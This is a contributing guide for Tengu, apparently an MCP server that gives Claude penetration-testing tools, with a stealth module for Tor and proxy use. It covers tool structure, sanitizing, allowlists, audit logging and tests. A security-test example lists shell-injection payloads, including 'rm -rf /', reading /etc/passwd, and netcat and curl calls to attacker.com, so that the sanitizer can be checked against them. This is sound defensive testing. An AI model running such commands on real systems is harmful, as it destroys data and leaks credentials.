# Contributing to Tengu

Thank you for your interest in contributing to Tengu. This guide covers everything you need to get started.

## Table of Contents

- [Getting Started](#getting-started)
- [Project Structure](#project-structure)
- [How to Add a New Tool](#how-to-add-a-new-tool)
- [How to Add a New Prompt](#how-to-add-a-new-prompt)
- [How to Add a New Resource](#how-to-add-a-new-resource)
- [Code Standards](#code-standards)
- [Testing](#testing)
- [Security Rules](#security-rules)
- [Submitting a Pull Request](#submitting-a-pull-request)

---

## Getting Started

### Prerequisites

- Python 3.12+
- [`uv`](https://github.com/astral-sh/uv) package manager

### Setup

```bash
git clone https://github.com/rfunix/tengu.git
cd tengu

# Install Python deps + dev extras (pytest, ruff, mypy)
make install-dev

# Run the test suite to confirm everything works
make test
```

### Useful Commands

```bash
make lint        # ruff check src/ tests/
make format      # ruff format src/ tests/
make typecheck   # mypy src/ (strict mode)
make check       # lint + typecheck
make test        # unit + security tests (no external tools needed)
make coverage    # pytest --cov, generates htmlcov/
make doctor      # check which pentest tools are installed
```

---

## Project Structure

```
src/tengu/
├── server.py              # FastMCP entry point — registers all tools/resources/prompts
├── config.py              # TenguConfig Pydantic model, load_config(), get_config()
├── types.py               # Shared Pydantic models (Host, Port, Finding, ScanResult…)
├── exceptions.py          # Custom exception hierarchy
├── security/              # sanitizer, allowlist, rate_limiter, audit logger
├── executor/              # Safe async subprocess runner (never shell=True)
├── stealth/               # Tor/proxy injection, UA rotation, timing jitter
├── tools/                 # 56 MCP tools, grouped by category
├── resources/             # 19 MCP resources (static JSON + loader functions)
└── prompts/               # 26 MCP workflow prompts
```

Every tool invocation passes through this mandatory pipeline:

```
sanitizer → allowlist → rate_limiter → audit_logger → executor
```

---

## How to Add a New Tool

Use `src/tengu/tools/recon/nmap.py` as the canonical reference. Follow all 8 steps — no exceptions.

### Step 1 — Create the file

Place it in the appropriate category under `src/tengu/tools/<category>/<toolname>.py`.
If a new category is needed, create the directory and add an `__init__.py`.

### Step 2 — Write the function signature

```python
from __future__ import annotations

import time
import structlog
from fastmcp import Context

from tengu.config import get_config
from tengu.executor.process import run_command
from tengu.executor.registry import resolve_tool_path
from tengu.security.allowlist import make_allowlist_from_config
from tengu.security.audit import get_audit_logger
from tengu.security.rate_limiter import rate_limited
from tengu.security.sanitizer import sanitize_target

logger = structlog.get_logger(__name__)


async def my_tool(
    ctx: Context,  # type: ignore[type-arg]
    target: str,
    option: str = "default",
    timeout: int | None = None,
) -> dict:  # type: ignore[type-arg]
```

### Step 3 — Write a complete docstring

FastMCP uses the docstring as the tool description shown to Claude. Include `Args:` and `Returns:` sections.

### Step 4 — Sanitize all inputs

```python
target = sanitize_target(target)
# use other sanitizers from security/sanitizer.py as needed:
# sanitize_url, sanitize_port_spec, sanitize_repo_url, sanitize_docker_image
```

### Step 5 — Check the allowlist

```python
allowlist = make_allowlist_from_config()
audit = get_audit_logger()
try:
    allowlist.check(target)
except Exception as exc:
    await audit.log_target_blocked("my_tool", target, str(exc))
    raise
```

### Step 6 — Build the argument list

```python
cfg = get_config()
tool_path = resolve_tool_path("mytool", cfg.tools.paths.mytool)
effective_timeout = timeout or cfg.tools.defaults.scan_timeout

args = [tool_path, "--option", option, target]
# Never build commands by string concatenation
```

### Step 7 — Execute with rate limiting and audit logging

```python
await ctx.report_progress(0, 100, f"Starting my_tool on {target}...")
params = {"target": target, "option": option}

async with rate_limited("my_tool"):
    start = time.monotonic()
    await audit.log_tool_call("my_tool", target, params, result="started")
    try:
        stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
    except Exception as exc:
        await audit.log_tool_call("my_tool", target, params, result="failed", error=str(exc))
        raise
    duration = time.monotonic() - start

await audit.log_tool_call("my_tool", target, params, result="completed", duration_seconds=duration)
await ctx.report_progress(100, 100, "Complete")

return {
    "tool": "my_tool",
    "target": target,
    ...
}
```

### Step 8 — Register in server.py

```python
# Add the import
from tengu.tools.category.my_tool import my_tool

# Register the tool
mcp.tool()(my_tool)
```

### Checklist for new tools

- [ ] `from __future__ import annotations` at the top
- [ ] All inputs sanitized before use
- [ ] Allowlist checked before any subprocess call
- [ ] `async with rate_limited(...)` wrapping the subprocess call
- [ ] Both `"started"` and `"completed"`/`"failed"` audit entries
- [ ] Return plain `dict`, not Pydantic models (call `.model_dump()`)
- [ ] Tool path resolved via `resolve_tool_path()`
- [ ] Registered in `server.py`
- [ ] Unit tests added in `tests/unit/`
- [ ] Security tests added in `tests/security/` (command injection, input validation)

---

## How to Add a New Prompt

Prompts are guided workflow templates. Add them to the appropriate file in `src/tengu/prompts/`.

```python
def my_workflow(target: str, option: str = "default") -> str:
    """One-line description shown to Claude.

    Args:
        target: The system or URL to assess.
        option: Workflow variant (default, thorough, quick).
    """
    return f"""Perform a {option} assessment of {target}.

1. Use `validate_target` to confirm {target} is in scope.
2. Use `check_tools` to verify required tools are available.
3. ...
"""
```

Then register in `server.py`:

```python
mcp.prompt()(my_workflow)
```

---

## How to Add a New Resource

Resources expose read-only reference data (OWASP, checklists, methodologies, etc.).

1. Add data or a loader function in `src/tengu/resources/`.
2. Register in `server.py` with a meaningful URI:

```python
@mcp.resource("myscheme://path/{param}")
def resource_my_data(param: str) -> str:
    """Description shown to Claude about this resource."""
    data = get_my_data(param)
    if not data:
        return json.dumps({"error": f"Not found: {param}"})
    return json.dumps(data, indent=2)
```

Use existing URI schemes where appropriate: `owasp://`, `ptes://`, `checklist://`, `tools://`, `prompts://`.

---

## Code Standards

### Language

All source code, comments, docstrings, variable names, and test names must be in **English**.

### Style

- Line limit: **100 characters** (enforced by ruff)
- Every file starts with `from __future__ import annotations`
- Full type annotations on every function parameter and return value
- Mypy strict mode — avoid `type: ignore`; when necessary, always add a comment explaining why
- Active ruff rules: `E, F, I, N, W, UP, B, C4, PTH, SIM`

### Logging

```python
# Always use structlog — never print() or logging.info()
logger = structlog.get_logger(__name__)
logger.info("scan started", target=target, ports=ports)
```

### Pydantic v2

```python
# Use model_validate() / model_dump(), not parse_obj() / dict()
result = MyModel.model_validate(data)
output = result.model_dump()
```

### Async

- Tool functions are `async def`
- Use `await ctx.report_progress(current, total, message)` to report scan progress
- Never use `subprocess.run` or `shell=True` — always use `run_command()` from `tengu.executor.process`

---

## Testing

Tests live in three directories:

| Directory | Purpose |
|-----------|---------|
| `tests/unit/` | Fast unit tests, no external tools required |
| `tests/security/` | Command injection and input validation tests (74 tests) |
| `tests/integration/` | Tests that require real tools installed |

### Running tests

```bash
make test           # unit + security (fast, recommended for development)
make test-unit      # unit only
make test-security  # security only
make test-all       # all tests including integration
```

### Writing tests

Every new tool needs at minimum:

1. **Unit tests** — test the parsing logic, output structure, and error handling with mocked subprocess calls
2. **Security tests** — verify that shell metacharacters, path traversal, and malformed inputs are rejected

```python
# tests/unit/test_my_tool.py
from unittest.mock import AsyncMock, patch
import pytest
from tengu.tools.category.my_tool import my_tool


@pytest.mark.asyncio
async def test_my_tool_returns_expected_structure(mock_ctx):
    with patch("tengu.tools.category.my_tool.run_command", new_callable=AsyncMock) as mock_run:
        mock_run.return_value = (b"output", b"", 0)
        result = await my_tool(mock_ctx, target="192.168.1.1")
        assert result["tool"] == "my_tool"
        assert result["target"] == "192.168.1.1"


# tests/security/test_my_tool_security.py
import pytest
from tengu.security.sanitizer import sanitize_target
from tengu.exceptions import InvalidInputError


@pytest.mark.parametrize("payload", [
    "192.168.1.1; rm -rf /",
    "192.168.1.1 && cat /etc/passwd",
    "192.168.1.1 | nc attacker.com 4444",
    "$(curl attacker.com)",
    "`id`",
])
def test_my_tool_rejects_shell_injection(payload):
    with pytest.raises(InvalidInputError):
        sanitize_target(payload)
```

---

## Security Rules

These are absolute requirements. PRs that violate them will not be merged.

| Rule | Requirement |
|------|-------------|
| No `shell=True` | Always use `run_command()` with a list of arguments |
| Sanitize first | Call the appropriate sanitizer before using any user input |
| Check allowlist | Call `allowlist.check(target)` before any subprocess call |
| Audit log | Write `"started"` and `"completed"`/`"failed"` audit entries for every tool call |
| Rate limit | Wrap all external process calls in `async with rate_limited("tool_name")` |
| No secrets in logs | Never log or return raw passwords, tokens, or API keys |

---

## Submitting a Pull Request

1. **Fork** the repository and create a branch from `main`:
   ```bash
   git checkout -b feat/my-new-tool
   ```

2. **Make your changes** following the guidelines above.

3. **Run the full check suite** before pushing:
   ```bash
   make check   # lint + typecheck
   make test    # unit + security tests
   ```

4. **Push and open a PR** against `main`. Describe:
   - What the change does
   - Why it is needed
   - How it was tested
   - Any external tool dependencies

5. **PR title format:**
   ```
   feat(tools): add my_tool integration
   fix(security): reject null bytes in sanitize_target
   docs(readme): update quick start section
   chore(deps): bump fastmcp to 3.1.0
   ```

### What gets reviewed

- Security pipeline compliance (sanitizer → allowlist → rate limit → audit)
- Test coverage (unit + security tests required for new tools)
- Code style and type annotations
- Docstring quality (Claude uses these to decide when and how to call the tool)

---

## Questions

Open a [GitHub Discussion](https://github.com/rfunix/tengu/discussions) for questions, ideas, or to share a demo of Tengu in action.

For bugs, use [GitHub Issues](https://github.com/rfunix/tengu/issues).
